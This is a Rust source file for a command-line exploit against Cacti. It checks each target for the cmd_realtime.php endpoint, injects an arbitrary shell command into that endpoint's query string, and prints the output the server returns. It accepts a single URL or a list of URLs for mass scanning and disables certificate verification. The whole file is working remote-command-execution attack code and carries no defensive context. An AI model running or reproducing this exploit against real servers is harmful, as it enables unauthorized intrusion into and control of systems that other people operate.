use reqwest::blocking::Client;
use reqwest::Url;
use std::env;
use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use std::process;

struct CactiValidator {
    client: Client,
}

impl CactiValidator {
    fn new() -> Self {
        let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
        CactiValidator { client }
    }
    //check
    fn validate(&self, url: &str) -> bool {
        let endpoint = "/cacti/cmd_realtime.php";
        let full_url = format!("{}{}", url, endpoint);
        let response_from_url = self.client.get(&full_url).send().unwrap();

        if response_from_url.status().is_success() {
            println!("Found Cacti");
            true
        } else {
            //pass
            false
        }
    }
}

struct RemoteCommandExecutor {
    client: Client,
}

impl RemoteCommandExecutor {
    fn new() -> Self {
        let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
        RemoteCommandExecutor { client }
    }
    //code execution area*
    fn execute(&self, url: &str, command: &str) {
        let parsed_url = Url::parse(url).unwrap();
        let stripped_url = format!("{}://{}", parsed_url.scheme(), parsed_url.host_str().unwrap());
        let payload_cac = format!("{}/cacti/cmd_realtime.php?1+1&&{}+1+1+1", stripped_url, command);

        println!("URL: {}", payload_cac);
        let response = self.client.get(&payload_cac).send().unwrap();
        let formatted = response.text().unwrap().replace("<br>", "\n").replace("<strong>", "").replace("</strong>", "");
        println!("{}", formatted);
    }
}
//file read area
fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
//usage area
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("Usage: app -m http://site.com/ -c whoami");
        println!("Or: app -w url_list.txt -c whoami");
        process::exit(1);
    }

    let mut url = String::new();
    let mut command = String::new();
    let mut url_list = Vec::new();
    //as u know args
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-m" => {
                if i + 1 < args.len() {
                    url = args[i + 1].clone();
                    i += 1;
                } else {
                    println!("Error: Missing URL after -m");
                    process::exit(1);
                }
            }
            "-c" => {
                if i + 1 < args.len() {
                    command = args[i + 1].clone();
                    i += 1;
                } else {
                    println!("Error: Missing command after -c");
                    process::exit(1);
                }
            }
            "-w" => {
                if i + 1 < args.len() {
                    let filename = &args[i + 1];
                    if let Ok(lines) = read_lines(filename) {
                        for line in lines {
                            if let Ok(url) = line {
                                url_list.push(url);
                            }
                        }
                    } else {
                        println!("Error: Could not read file {}", filename);
                        process::exit(1);
                    }
                    i += 1;
                } else {
                    println!("Error: Missing filename after -w");
                    process::exit(1);
                }
            }
            _ => {
                println!("Error: Unknown argument {}", args[i]);
                process::exit(1);
            }
        }
        i += 1;
    }

    if url_list.is_empty() && url.is_empty() {
        println!("Error: No URL provided");
        process::exit(1);
    }

    let validator = CactiValidator::new();
    let executor = RemoteCommandExecutor::new();

    if !url_list.is_empty() {
        for url in url_list {
            if validator.validate(&url) {
                executor.execute(&url, &command);
            }
        }
    } else {
        if validator.validate(&url) {
            executor.execute(&url, &command);
        }
    }
}
